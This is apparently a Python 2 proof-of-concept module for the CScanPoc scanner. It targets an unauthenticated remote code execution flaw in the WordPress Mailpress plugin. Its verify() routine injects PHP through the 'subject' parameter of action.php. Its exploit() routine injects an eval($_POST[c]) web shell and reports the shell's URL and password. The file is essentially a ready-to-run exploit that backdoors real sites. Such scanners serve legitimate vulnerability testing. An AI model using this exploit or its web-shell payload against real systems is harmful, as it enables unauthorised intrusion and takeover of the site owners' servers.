# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'WordPress_0082' # 平台漏洞编号，留空
    name = 'WordPress-Mailpress插件远程代码执行漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2016-07-12'  # 漏洞公布时间
    desc = '''
        Mailpress存在越权调用，在不登陆的情况下，可以调用系统某些方法，造成远程命令执行。
        漏洞文件：mailpress\mp-includes\action.php
        subject参数造成远程命令执行。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/3960/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress-Mailpress插件'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '644df2fe-2421-4d0e-bb9c-f9d117377386'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            payload = "/wp-content/plugins/mailpress/mp-includes/action.php"
            data = "action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();?>&html=&plaintext=&mail_format=standard&autosave=1"
            url = self.target + payload
            r = requests.post(url, data=data)
            old_id = 0
            if re.findall(r'old_id="(\d+)"', r.text):
                old_id = int(re.findall(r'old_id="(\d+)"', r.text)[0])
            verify_url = self.target + '/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={intid}'.format(intid=old_id)
            r = requests.get(verify_url)

            if r.status_code == 200 and 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            payload = "/wp-content/plugins/mailpress/mp-includes/action.php"
            data = "action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();eval($_POST[c]);?>&html=&plaintext=&mail_format=standard&autosave=1"
            url = self.target + payload
            r = requests.post(url, data=data)
            old_id = 0
            if re.findall(r'old_id="(\d+)"', r.text):
                old_id = int(re.findall(r'old_id="(\d+)"', r.text)[0])
            verify_url = self.target + '/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={intid}'.format(intid=old_id)
            r = requests.get(verify_url)

            if r.status_code == 200 and 'PHP Version' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target,name=self.vuln.name, url=verify_url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        

if __name__ == '__main__':
    Poc().run()